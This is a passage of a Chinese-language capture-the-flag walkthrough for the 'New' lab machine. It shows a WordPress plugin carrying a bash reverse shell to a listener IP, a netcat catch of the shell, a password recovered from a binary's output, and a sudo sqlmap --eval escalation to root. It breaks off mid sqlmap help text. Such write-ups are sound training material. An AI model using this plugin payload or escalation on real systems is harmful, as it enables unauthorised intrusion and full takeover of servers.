186<br>[+] Cached Requests: 7<br>[+] Data Sent: 46.455 KB<br>[+] Data Received: 394.551 KB<br>[+] Memory used: 278.145 MB<br>[+] Elapsed <span class="hljs-keyword">time</span>: 00:00:17<br></code></pre></td></tr></table></figure>
+<p>得到网站的用户名和密码：<code>sublarge:sublarge2025</code></p>
+<p>登录网站<br><img src="https://miaorj.oss-cn-chengdu.aliyuncs.com/obsidian/202507022257428.png" srcset="https://miaorj.oss-cn-chengdu.aliyuncs.com/img/loading.gif" lazyload></p>
+<p>创建一个简单反弹shell的插件</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * Plugin Name: Reverse Shell Plugin</span><br><span class="hljs-comment"> * Plugin URI: </span><br><span class="hljs-comment"> * Description: Reverse Shell Plugin for penetration testing.</span><br><span class="hljs-comment"> * Version: 1.0</span><br><span class="hljs-comment"> * Author: Security Analyst</span><br><span class="hljs-comment"> * Author URI: http://www.example.com</span><br><span class="hljs-comment"> */</span><br><span class="hljs-title function_ invoke__">exec</span>(<span class="hljs-string">&quot;/bin/bash -c &#x27;bash -i &gt;&amp; /dev/tcp/192.168.86.99/443 0&gt;&amp;1&#x27;&quot;</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p>压缩成<code>zip</code>压缩包</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[/miao/maze-sec/New]<br>└─# vi wp_re.php<br><br>┌──(root㉿kali)-[/miao/maze-sec/New]<br>└─# zip wp_re.zip wp_re.php <br>  adding: wp_re.php (deflated 29%)<br></code></pre></td></tr></table></figure>
+
+<p>安装插件，开启监听后，启用插件，成功获取shell</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[/miao/maze-sec/New]<br>└─# nc -lvnp 4444<br>listening on [any] 4444 ...<br>connect to [192.168.2.4] from (UNKNOWN) [192.168.2.43] 54594<br>bash: cannot <span class="hljs-built_in">set</span> terminal process group (471): Inappropriate ioctl <span class="hljs-keyword">for</span> device<br>bash: no job control <span class="hljs-keyword">in</span> this shell<br>www-data@New:/var/www/new.dsz/wp-admin$ <br></code></pre></td></tr></table></figure>
+
+
+<p><strong>USER FLAG</strong><br><code>/home</code>目录下面有两个用户<code>ahiz</code>和<code>andeli</code><br>但<code>andeli</code>用户权限不足，无法进入</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">www-data@New:/home$ <span class="hljs-built_in">cd</span> andeli<br><span class="hljs-built_in">cd</span> andeli<br>bash: <span class="hljs-built_in">cd</span>: andeli: Permission denied<br></code></pre></td></tr></table></figure>
+
+<p>成功获取到<code>user flag</code></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">www-data@New:/home/ahiz$ <span class="hljs-built_in">cat</span> user.txt<br><span class="hljs-built_in">cat</span> user.txt<br>flag&#123;user-7b03ed18-5665-11f0-865b-5b1db8a6483b&#125;<br></code></pre></td></tr></table></figure>
+
+<h1 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h1><h2 id="1、获取andeli权限"><a href="#1、获取andeli权限" class="headerlink" title="1、获取andeli权限"></a>1、获取andeli权限</h2><p><code>/opt</code>目录下面存在一个文件<code>andeli_cred</code></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">www-data@New:/opt$ <span class="hljs-built_in">ls</span> -la<br><span class="hljs-built_in">ls</span> -la<br>total 28<br>drwxr-xr-x  2 root root  4096 Jul  1 06:34 .<br>drwxr-xr-x 18 root root  4096 Mar 18 20:37 ..<br>-rwx--x--x  1 root root 16840 Jul  1 06:33 andeli_cred<br></code></pre></td></tr></table></figure>
+
+<p>发现拥有执行权限，尝试运行，运行后发现是<code>md5</code>值，查看前面的行数</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs bash">www-data@New:/opt$ ./andeli_cred &gt; /tmp/1.txt<br>www-data@New:/tmp$ <span class="hljs-built_in">cat</span> 1.txt|<span class="hljs-built_in">head</span> <br><span class="hljs-built_in">cat</span> 1.txt|<span class="hljs-built_in">head</span> <br>固定MD5插入位置: 7545<br>facbade1e798d215d4685d1316e91510<br>0dbaaac8150e71345acb7de93c241351<br>00caa83bd3945d9a755e3376f9b1c02c<br>0e7b6a63d082d1d462296a053b60b9cb<br>736edd1bd9daaae1d0a3aa8e5fe08acf<br>e2dbff6c8463e44b5eef97de6bfe6bd4<br>dbfda692a0584949829196ff2ed89bc7<br>6b401d2bd84218b9a4a4ba3d8152c192<br>cd2ea498cdae5570a245c72487648f64<br></code></pre></td></tr></table></figure>
+
+<p>提示固定<code>MD5</code>插入的位置在<code>7545</code>，提取相关的行数</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">www-data@New:/tmp$ awk <span class="hljs-string">&#x27;NR&gt;7544 &amp;&amp; NR &lt;7547 &#123;print NR &quot;:&quot; $0&#125;&#x27;</span> 1.txt<br>awk <span class="hljs-string">&#x27;NR&gt;7544 &amp;&amp; NR &lt;7547 &#123;print NR &quot;:&quot; $0&#125;&#x27;</span> 1.txt<br>7545:c82402fcc82eede0d7de1a3a03e713ae<br>7546:9eeb22195b4eb7a35bcad0f45761eb7b<br></code></pre></td></tr></table></figure>
+<p>找到目标的<code>MD5</code>值：<code>9eeb22195b4eb7a35bcad0f45761eb7b</code></p>
+<p>直接使用<code>MD5值</code>即可登录</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">www-data@New:/tmp$ su - andeli<br>su - andeli<br>Password: 9eeb22195b4eb7a35bcad0f45761eb7b<br><span class="hljs-built_in">id</span><br>uid=1002(andeli) gid=1002(andeli) <span class="hljs-built_in">groups</span>=1002(andeli)<br>/usr/bin/script -qc /bin/bash /dev/null<br>andeli@New:~$ <br></code></pre></td></tr></table></figure>
+
+<h2 id="2、获取root权限"><a href="#2、获取root权限" class="headerlink" title="2、获取root权限"></a>2、获取root权限</h2><p>执行<code>sudo -l</code>，发现可以执行<code>/usr/bin/sqlmap</code></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">andeli@New:~$ <span class="hljs-built_in">sudo</span> -l<br>Matching Defaults entries <span class="hljs-keyword">for</span> andeli on New:<br>    env_reset, mail_badpass,<br>    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin<br><br>User andeli may run the following commands on New:<br>    (ALL) NOPASSWD: /usr/bin/sqlmap<br></code></pre></td></tr></table></figure>
+
+<h3 id="sqlmap提权"><a href="#sqlmap提权" class="headerlink" title="sqlmap提权"></a>sqlmap提权</h3><h4 id="方案一：sudo"><a href="#方案一：sudo" class="headerlink" title="方案一：sudo"></a>方案一：sudo</h4><p>直接使用<code>gtfobins</code>的方案<br><a target="_blank" rel="noopener" href="https://gtfobins.github.io/gtfobins/sqlmap/">https://gtfobins.github.io/gtfobins/sqlmap/</a></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> sqlmap -u 127.0.0.1 --<span class="hljs-built_in">eval</span>=<span class="hljs-string">&quot;import os; os.system(&#x27;/bin/sh&#x27;)&quot;</span><br></code></pre></td></tr></table></figure>
+
+<p>运行即可</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs bash">andeli@New:~$ <span class="hljs-built_in">sudo</span> sqlmap -u 127.0.0.1 --<span class="hljs-built_in">eval</span>=<span class="hljs-string">&quot;import os; os.system(&#x27;/bin/sh&#x27;)&quot;</span><br>        ___<br>       __H__<br> ___ ___[<span class="hljs-string">&quot;]_____ ___ ___  &#123;1.5.2#stable&#125;</span><br><span class="hljs-string">|_ -| . [&#x27;]     | .&#x27;| . |</span><br><span class="hljs-string">|___|_  [&#x27;]_|_|_|__,|  _|</span><br><span class="hljs-string">      |_|V...       |_|   http://sqlmap.org</span><br><span class="hljs-string"></span><br><span class="hljs-string">[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user&#x27;s responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program</span><br><span class="hljs-string"></span><br><span class="hljs-string">[*] starting @ 10:17:55 /2025-07-02/</span><br><span class="hljs-string"></span><br><span class="hljs-string">[10:17:55] [INFO] testing connection to the target URL</span><br><span class="hljs-string"># id</span><br><span class="hljs-string">uid=0(root) gid=0(root) groups=0(root)</span><br></code></pre></td></tr></table></figure>
+
+<h4 id="方案二：sqlmap读取文件"><a href="#方案二：sqlmap读取文件" class="headerlink" title="方案二：sqlmap读取文件"></a>方案二：sqlmap读取文件</h4><p>查看<code>sqlmap</code>的详细用法</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br></pre></td><td class="code"><pre><code class="hljs bash">andeli@New:~$ <span class="hljs-built_in">sudo</span> /usr/bin/sqlmap -hh<br>        ___<br>       __H__<br> ___ ___[(]_____ ___ ___  &#123;1.5.2#stable&#125;<br>|_ -| . [.]     | .<span class="hljs-string">&#x27;| . |</span><br><span class="hljs-string">|___|_  [&quot;]_|_|_|__,|  _|</span><br><span class="hljs-string">      |_|V...       |_|   http://sqlmap.org</span><br><span class="hljs-string"></span><br><span class="hljs-string">Usage: python3 sqlmap [options]</span><br><span class="hljs-string"></span><br><span class="hljs-string">Options:</span><br><span class="hljs-string">  -h, --help            Show basic help message and exit</span><br><span class="hljs-string">  -hh                   Show advanced help message and exit</span><br><span class="hljs-string">  --version             Show program&#x27;</span>s version number and <span class="hljs-built_in">exit</span><br>  -v VERBOSE            Verbosity level: 0-6 (default 1)<br><br>  Target:<br>    At least one of these options has to be provided to define the<br>    target(s)<br><br>    -u URL, --url=URL   Target URL (e.g. <span class="hljs-string">&quot;http://www.site.com/vuln.php?id=1&quot;</span>)<br>    -d DIRECT           Connection string <span class="hljs-keyword">for</span> direct database connection<br>    -l LOGFILE          Parse target(s) from Burp or WebScarab proxy <span class="hljs-built_in">log</span> file<br>    -m BULKFILE         Scan multiple targets given <span class="hljs-keyword">in</span> a textual file<br>    -r REQUESTFILE      Load HTTP request from a file<br>    -g GOOGLEDORK       Process Google dork results as target URLs<br>    -c CONFIGFILE       Load options from a configuration INI file<br><br>  Request:<br>    These options can be used to specify how to connect to the target URL<br><br>    -A AGENT, --user..  HTTP User-Agent header value<br>    -H HEADER, --hea..  Extra header (e.g. <span class="hljs-string">&quot;X-Forwarded-For: 127.0.0.1&quot;</span>)<br>    --method=METHOD     Force usage of given HTTP method (e.g. PUT)<br>    --data=DATA         Data string to be sent through POST (e.g. <span class="hljs-string">&quot;id=1&quot;</span>)<br>    --param-del=PARA..  Character used <span class="hljs-keyword">for</span> splitting parameter values (e.g. &amp;)<br>    --cookie=COOKIE     HTTP Cookie header value (e.g. <span class="hljs-string">&quot;PHPSESSID=a8d127e..&quot;</span>)<br>    --cookie-del=COO..  Character used <span class="hljs-keyword">for</span> splitting cookie values (e.g. ;)<br>    --live-cookies=L..  Live cookies file used <span class="hljs-keyword">for</span> loading up-to-date values<br>    --load-cookies=L..  File containing cookies <span class="hljs-keyword">in</span> Netscape/wget format<br>    --drop-set-cookie   Ignore Set-Cookie header from response<br>    --mobile            Imitate smartphone through HTTP User-Agent header<br>    --random-agent      Use randomly selected HTTP User-Agent header value<br>    --host=HOST         HTTP Host header value<br>    --referer=REFERER   HTTP Referer header value<br>    --headers=HEADERS   Extra headers (e.g. <span class="hljs-string">&quot;Accept-Language: fr\nETag: 123&quot;</span>)<br>    --auth-type=AUTH..  HTTP authentication <span class="hljs-built_in">type</span> (Basic, Digest, NTLM or PKI)<br>    --auth-cred=AUTH..  HTTP authentication credentials (name:password)<br>    --auth-file=AUTH..  HTTP authentication PEM cert/private key file<br>    --ignore-code=IG..  Ignore (problematic) HTTP error code (e.g. 401)<br>    --ignore-proxy      Ignore system default proxy settings<br>    --ignore-redirects  Ignore redirection attempts<br>    --ignore-timeouts   Ignore connection timeouts<br>    --proxy=PROXY       Use a proxy to connect to the target URL<br>    --proxy-cred=PRO..  Proxy authentication credentials (name:password)<br>    --proxy-file=PRO..  Load proxy list from a file<br>    --proxy-freq=PRO..  Requests between change of proxy from a given list<br>    --tor               Use Tor anonymity network<br>    --tor-port=TORPORT  Set Tor proxy port other than default<br>    --tor-type=TORTYPE  Set Tor proxy <span class="hljs-built_in">type</span> (HTTP, SOCKS4 or SOCKS5 (default))<br>    --check-tor         Check to see <span class="hljs-keyword">if</span> Tor is used properly<br>    --delay=DELAY       Delay <span class="hljs-keyword">in</span> seconds between each HTTP request<br>    --<span class="hljs-built_in">timeout</span>=TIMEOUT   Seconds to <span class="hljs-built_in">wait</span> before <span class="hljs-built_in">timeout</span> connection (default 30)<br>    --retries=RETRIES   Retries when the connection timeouts (default 3)<br>    --randomize=RPARAM  Randomly change value <span class="hljs-keyword">for</span> given parameter(s)<br>    --safe-url=SAFEURL  URL address to visit frequently during testing<br>    --safe-post=SAFE..  POST data to send to a safe URL<br>    --safe-req=SAFER..  Load safe HTTP request from a file<br>    --safe-freq=SAFE..  Regular requests between visits to a safe URL<br>    --skip-urlencode    Skip URL encoding of payload data<br>    --csrf-token=CSR..  Parameter used to hold anti-CSRF token<br>    --csrf-url=CSRFURL  URL address to visit <span class="hljs-keyword">for</span> extraction of anti-CSRF token<br>    --csrf-method=CS..  HTTP method to use during anti-CSRF token page visit<br>    --csrf-retries=C..  Retries <span class="hljs-keyword">for</span> anti-CSRF token retrieval (default 0)<br>    --force-ssl         Force usage of SSL/HTTPS<br>    --chunked           Use HTTP chunked transfer encoded (POST) requests<br>    --hpp               Use HTTP parameter pollution method<br>    --<span class="hljs-built_in">eval</span>=EVALCODE     Evaluate provided Python code before the request (e.g.<br>                        <span class="hljs-string">&quot;import hashlib;id2=hashlib.md5(id).hexdigest()&quot;</span>)<br><br>  Optimization:<br>    These options can be used to optimize the performance of sqlmap<br><br>    -o                  Turn on all optimization switches<br>    --predict-output    Predict common queries output<br>    --keep-alive        Use persistent HTTP(s) connections<br>    --null-connection   Retrieve page length without actual HTTP response body<br>    --threads=THREADS   Max number of concurrent HTTP(s) requests (default 1)<br><br>  Injection:<br>    These options can be used to specify <span class="hljs-built_in">which</span> parameters to <span class="hljs-built_in">test</span> <span class="hljs-keyword">for</span>,<br>    provide custom injection payloads and optional tampering scripts<br><br>    -p TESTPARAMETER    Testable parameter(s)<br>    --skip=SKIP         Skip testing <span class="hljs-keyword">for</span> given parameter(s)<br>    --skip-static       Skip testing parameters that not appear to be dynamic<br>    --param-exclude=..  Regexp to exclude parameters from testing (e.g. <span class="hljs-string">&quot;ses&quot;</span>)<br>    --param-filter=P..  Select testable parameter(s) by place (e.g. <span class="hljs-string">&quot;POST&quot;</span>)<br>    --dbms=DBMS         Force back-end DBMS to provided value<br>    --dbms-cred=DBMS..  DBMS authentication credentials (user:password)<br>    --os=OS             Force back-end DBMS operating system to provided value<br>    --invalid-bignum    Use big numbers <span class="hljs-keyword">for</span> invalidating values<br>    --invalid-logical   Use logical operations <span class="hljs-keyword">for</span> invalidating values<br>    --invalid-string    Use random strings <span class="hljs-keyword">for</span> invalidating values<br>    --no-cast           Turn off payload casting mechanism<br>    --no-escape         Turn off string escaping mechanism<br>    --prefix=PREFIX     Injection payload prefix string<br>    --suffix=SUFFIX     Injection payload suffix string<br>    --tamper=TAMPER     Use given script(s) <span class="hljs-keyword">for</span> tampering injection data<br><br>  Detection:<br>    These options can be used to customize the detection phase<br><br>    --level=LEVEL       Level of tests to perform (1-5, default 1)<br>    --risk=RISK         Risk of tests to perform (1-3, default 1)<br>    --string=STRING     String to match when query is evaluated to True<br>    --not-string=NOT..  String to match when query is evaluated to False<br>    --regexp=REGEXP     Regexp to match when query is evaluated to True<br>    --code=CODE         HTTP code to match when query is evaluated to True<br>    --smart             Perform thorough tests only <span class="hljs-keyword">if</span> positive heuristic(s)<br>    --text-only         Compare pages based only on the textual content<br>    --titles            Compare pages based only on their titles<br><br>  Techniques:<br>    These options can be used to tweak testing of specific SQL injection<br>    techniques<br><br>    --technique=TECH..  SQL injection techniques to use (default <span class="hljs-string">&quot;BEUSTQ&quot;</span>)<br>    --time-sec=TIMESEC  Seconds to delay the DBMS response (default 5)<br>    --union-cols=UCOLS  Range of columns to <span class="hljs-built_in">test</span> <span class="hljs-keyword">for</span> UNION query SQL injection<br>    --union-char=UCHAR  Character to use <span class="hljs-keyword">for</span> bruteforcing number of columns<br>    --union-from=UFROM  Table to use <span class="hljs-keyword">in</span> FROM part of UNION query SQL injection<br>    --dns-domain=DNS..  Domain name used <span class="hljs-keyword">for</span> DNS exfiltration attack<br>    --second-url=SEC..  Resulting page URL searched <span class="hljs-keyword">for</span> second-order response<br>    --second-req=SEC..  Load second-order HTTP request from file<br><br>  Fingerprint:<br>    -f, --fingerprint   Perform an extensive DBMS version fingerprint<br><br>  Enumeration:<br>    These options can be used to enumerate the back-end database<br>    management system information, structure and data contained <span class="hljs-keyword">in</span> the<br>    tables<br><br>    -a, --all           Retrieve everything<br>    -b, --banner        Retrieve DBMS banner<br>    --current-user      Retrieve DBMS current user<br>    --current-db        Retrieve DBMS current database<br>    --hostname          Retrieve DBMS server hostname<br>    --is-dba            Detect <span class="hljs-keyword">if</span> the DBMS current user is DBA<br>    --<span class="hljs-built_in">users</span>             Enumerate DBMS <span class="hljs-built_in">users</span><br>    --passwords         Enumerate DBMS <span class="hljs-built_in">users</span> password hashes<br>    --privileges        Enumerate DBMS <span class="hljs-built_in">users</span> privileges<br>    --roles             Enumerate DBMS <span class="hljs-built_in">users</span> roles<br>    --dbs               Enumerate DBMS databases<br>    --tables            Enumerate DBMS database tables<br>    --columns           Enumerate DBMS database table columns<br>    --schema            Enumerate DBMS schema<br>    --count             Retrieve number of entries <span class="hljs-keyword">for</span> table(s)<br>    --dump              Dump DBMS database table entries<br>    --dump-all          Dump all DBMS databases tables entries<br>    --search            Search column(s), table(s) and/or database name(s)<br>    --comments          Check <span class="hljs-keyword">for</span> DBMS comments during enumeration<br>    --statements        Retrieve SQL statements being run on DBMS<br>    -D DB               DBMS database to enumerate<br>    -T TBL              DBMS database table(s) to enumerate<br>    -C COL              DBMS database table column(s) to enumerate<br>    -X EXCLUDE          DBMS database identifier(s) to not enumerate<br>    -U USER             DBMS user to enumerate<br>    --exclude-sysdbs    Exclude DBMS system databases when enumerating tables<br>    --pivot-column=P..  Pivot column name<br>    --<span class="hljs-built_in">where</span>=DUMPWHERE   Use WHERE condition <span class="hljs-keyword">while</span> table dumping<br>    --start=LIMITSTART  First dump table entry to retrieve<br>    --stop=LIMITSTOP    Last dump table entry to retrieve<br>    --first=FIRSTCHAR   First query output word character to retrieve<br>    --last=LASTCHAR     Last query output word character to retrieve<br>    --sql-query=SQLQ..  SQL statement to be executed<br>    --sql-shell         Prompt <span class="hljs-keyword">for</span> an interactive SQL shell<br>    --sql-file=SQLFILE  Execute SQL statements from given file(s)<br><br>  Brute force:<br>    These options can be used to run brute force checks<br><br>    --common-tables     Check existence of common tables<br>    --common-columns    Check existence of common columns<br>    --common-files      Check existence of common files<br><br>  User-defined <span class="hljs-keyword">function</span> injection:<br>    These options can be used to create custom user-defined <span class="hljs-built_in">functions</span><br><br>    --udf-inject        Inject custom user-defined <span class="hljs-built_in">functions</span><br>    --shared-lib=SHLIB  Local path of the shared library<br><br>  File system access:<br>    These options can be used to access the back-end database management<br>    system underlying file system<br><br>    --file-read=FILE..  Read a file from the back-end DBMS file system<br>    --file-write=FIL..  Write a <span class="hljs-built_in">local</span> file on the back-end DBMS file system<br>    --file-dest=FILE..  Back-end DBMS absolute filepath to write to<br><br>  Operating system access:<br>    These options can be used to access the back-end database management<br>    system underlying operating system<br><br>    --os-cmd=OSCMD      Execute an operating system <span class="hljs-built_in">command</span><br>    --os-shell          Prompt <span class="hljs-keyword">for</span> an interactive operating system shell<br>    --os-pwn            Prompt <span class="hljs-keyword">for</span> an OOB shell, Meterpreter or VNC<br>    --os-smbrelay       One click prompt <span class="hljs-keyword">for</span> an OOB shell, Meterpreter or VNC<br>    --os-bof            Stored procedure buffer overflow exploitation<br>    --priv-esc          Database process user privilege escalation<br>    --msf-path=MSFPATH  Local path <span class="hljs-built_in">where</span> Metasploit Framework is installed<br>    --tmp-path=TMPPATH  Remote absolute path of temporary files directory<br><br>  Windows registry access:<br>    These options can be used to access the back-end database management<br>    system Windows registry<br><br>    --reg-read          Read a Windows registry key value<br>    --reg-add           Write a Windows registry key value data<br>    --reg-del           Delete a Windows registry key value<br>    --reg-key=REGKEY    Windows registry key<br>    --reg-value=REGVAL  Windows registry key value<br>    --reg-data=REGDATA  Windows registry key value data<br>    --reg-type=REGTYPE  Windows registry key value <span class="hljs-built_in">type</span><br><br>  General:<br>    These options can be used to <span class="hljs-built_in">set</span> some general working parameters<br><br>    -s SESSIONFILE      Load session from a stored (.sqlite) file<br>    -t TRAFFICFILE      Log all HTTP traffic into a textual file<br>    --answers=ANSWERS   Set predefined answers (e.g. <span class="hljs-string">&quot;quit=N,follow=N&quot;</span>)<br>    --<span class="hljs-built_in">base64</span>=BASE64P..  Parameter(s) containing Base64 encoded data<br>    --base64-safe       Use URL and filename safe Base64 alphabet (RFC 4648)<br>    --batch             